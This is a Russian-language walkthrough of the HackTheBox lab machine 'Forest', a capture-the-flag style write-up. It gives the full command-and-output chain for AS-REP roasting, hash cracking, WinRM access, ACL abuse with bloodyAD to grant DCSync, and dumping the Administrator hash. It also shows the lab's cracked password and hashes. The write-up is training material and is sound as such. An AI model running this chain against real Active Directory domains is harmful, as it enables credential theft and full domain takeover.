# Forest (2026)

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (238).png" alt=""><figcaption></figcaption></figure></div>

## Тэги:

* AS-REP Roasting
* GenericAll -> Group
* WriteDacl -> Domain

## Разведка

Сканирование портов:

```shellscript
┌──(trager㉿hackandgtfo)-[~/HackTheBox/Forest]
└─$ nmap -sC -sV 10.129.76.65 -oN nmap.out 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-18 12:13 EST
Nmap scan report for forest (10.129.76.65)
Host is up (0.038s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-01-18 17:20:21Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-01-18T09:20:30-08:00
|_clock-skew: mean: 2h46m47s, deviation: 4h37m09s, median: 6m46s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2026-01-18T17:20:29
|_  start_date: 2026-01-17T21:59:46
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

## Первоначальный доступ - svc-alfresco (Null Session: AS-REP Roasting)

Во время тестирования был обнаружен `Null session` (анонимная сессия) для подключения к `SMB` и `LDAP`:

```shellscript
┌──(trager㉿hackandgtfo)-[~/HackTheBox/Forest]
└─$ nxc smb 10.129.76.65 -u '' -p ''            
SMB         10.129.76.65    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.76.65    445    FOREST           [+] htb.local\: 
                                                                                                                                                               
┌──(trager㉿hackandgtfo)-[~/HackTheBox/Forest]
└─$ nxc ldap 10.129.76.65 -u '' -p ''
SMB         10.129.76.65    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
LDAP        10.129.76.65    389    FOREST           [+] htb.local\:
```

Была найдена УЗ `svc-alfresco`, которая имеет специальный `UAC` флаг `Не требовать предварительной аутентификации Kerberos`. В таком случае можно проэксплуатировать `AS-REP Roasting`, используя `impacket-GetNPUsers`:

{% code overflow="wrap" %}
```shellscript
┌──(trager㉿hackandgtfo)-[~/HackTheBox/Forest]
└─$ sudo ntpdate 10.129.76.65
2026-01-18 12:27:23.252834 (-0500) +406.685368 +/- 0.022380 10.129.76.65 s1 no-leap
CLOCK: time stepped by 406.685368

┌──(trager㉿hackandgtfo)-[~/HackTheBox/Forest]
└─$ impacket-GetNPUsers 'htb.local/' -dc-ip 10.129.76.65 -request         
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2026-01-18 12:26:48.588123  2026-01-17 17:52:14.867890  0x410200 


$krb5asrep$23$svc-alfresco@HTB.LOCAL:bcc24b124cca0fac0bb2768692417446$f3ce924aaa094f528bbca7b087fe444395e5f9a83cd86768ff48e246474000a79e698d622d6e2c1fcbe472b6fe5117ab76e41fa29b634e5a5c25bcc6d1c60c2dd38dcb069b91217a1f21aecad18910824dbb8478b1be505941b5457837f716a8983f6f217f0553a3b405f5138d7bd5dda5c8d6926b55c0e43c73239958609275d8f0c078855f14d9c77dda18a7d797e258d05754ea4ad8a2735595fcb1717ff08da1cbfa49804d7a06fcfa704fefc04bb57afa7bcd3268cf0189392079a00c2775f08a64006c0691ca881e53b0c826c3a8005c680f1b39101373fd6aae90270507bfb114759e
```
{% endcode %}

С помощью утилиты `hashcat` был сбручен `krb5asrep`-хеш:

{% code overflow="wrap" %}
```shellscript
┌──(trager㉿hackandgtfo)-[~/HackTheBox/Forest]
└─$ sudo hashcat -m 18200 asreproasting.out /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule                  
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 9 5950X 16-Core Processor, 2898/5861 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

$krb5asrep$23$svc-alfresco@HTB.LOCAL:bcc24b124cca0fac0bb2768692417446$f3ce924aaa094f528bbca7b087fe444395e5f9a83cd86768ff48e246474000a79e698d622d6e2c1fcbe472b6fe5117ab76e41fa29b634e5a5c25bcc6d1c60c2dd38dcb069b91217a1f21aecad18910824dbb8478b1be505941b5457837f716a8983f6f217f0553a3b405f5138d7bd5dda5c8d6926b55c0e43c73239958609275d8f0c078855f14d9c77dda18a7d797e258d05754ea4ad8a2735595fcb1717ff08da1cbfa49804d7a06fcfa704fefc04bb57afa7bcd3268cf0189392079a00c2775f08a64006c0691ca881e53b0c826c3a8005c680f1b39101373fd6aae90270507bfb114759e:s3rvice
```
{% endcode %}

И подтверждена валидность данных с помощью `nxc`:

```shellscript
┌──(trager㉿hackandgtfo)-[~/HackTheBox/Forest]
└─$ nxc smb 10.129.76.65 -u 'svc-alfresco' -p 's3rvice'
SMB         10.129.76.65    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.76.65    445    FOREST           [+] htb.local\svc-alfresco:s3rvice
```

УЗ `svc-alfresco` также состоит в группе `REMOTE MANAGEMENT USERS`, поэтому у неё есть доступ к хосту через `winrm`:

```shellscript
┌──(trager㉿hackandgtfo)-[~/HackTheBox/Forest/Bloodhound]
└─$ evil-winrm -i 10.129.76.65 -u 'svc-alfresco' -p 's3rvice' 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```

## Повышение привилегий - Administrator (GenericAll на группу, WriteDacl на домен, DCSync)

Сбор информации для `bloodhound`:

```shellscript
┌──(trager㉿hackandgtfo)-[~/HackTheBox/Forest/Bloodhound]
└─$ bloodhound-python -u 'svc-alfresco' -p 's3rvice' -dc forest.htb.local -d htb.local -ns 10.129.76.65 -c all 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: forest.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: forest.htb.local
INFO: Found 32 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done in 00M 41S
                                                                                                                                                               
┌──(trager㉿hackandgtfo)-[~/HackTheBox/Forest/Bloodhound]
└─$ ls
20260118124914_computers.json   20260118124914_domains.json  20260118124914_groups.json  20260118124914_users.json
20260118124914_containers.json  20260118124914_gpos.json     20260118124914_ous.json
```



УЗ `svc-aflresco` состоит в группах `SERVICE ACCOUNTS -> PRIVILEGED IT ACCOUNTS -> ACCOUNT OPERATORS`. Последняя группа имеет `ACL` `GenericAll` на группу `EXCHANGE WINDOWS PERMISSIONS`, которая в свою очередь, имеет `WriteDacl` на домен `htb.local`:

<figure><img src="../../../.gitbook/assets/image (236).png" alt=""><figcaption></figcaption></figure>

В `Bloodhound` существуют подсказки для эксплуатации `ACL'ов`. Пример для `GenericAll` на группу:

<figure><img src="../../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>

Проверить группы, в которых состоит пользователь на текущий момент, можно с помощью следующей команды:

```shellscript
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

Далее можно использовать `bloodyAD`, чтобы проэксплуатировать `GenericAll` (добавление пользователя в группу `EXCHANGE WINDOWS PERMISSIONS`) и `WriteDacl` (добавление возможности `DCSync` пользователю):

```shellscript
┌──(trager㉿hackandgtfo)-[/opt]
└─$ bloodyAD -d 'htb.local' -u 'svc-alfresco' -p 's3rvice' --host 10.129.76.65 add groupMember "EXCHANGE WINDOWS PERMISSIONS" "svc-alfresco" 
[+] svc-alfresco added to EXCHANGE WINDOWS PERMISSIONS
                                                                                                                                    
┌──(trager㉿hackandgtfo)-[/opt]
└─$ bloodyAD -d 'htb.local' -u 'svc-alfresco' -p 's3rvice' --host 10.129.76.65 add dcsync svc-alfresco
[+] svc-alfresco is now able to DCSync

┌──(trager㉿hackandgtfo)-[/opt]
└─$ impacket-secretsdump 'htb.local/svc-alfresco:s3rvice'@forest.htb.local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
<...вырезано...>
[*] Cleaning up...
```

После добавления `ACL` и эксплуатации `DCSync`, можно использовать `Pass The Hash`, чтобы подключиться к хосту от имени администратора:

<figure><img src="../../../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

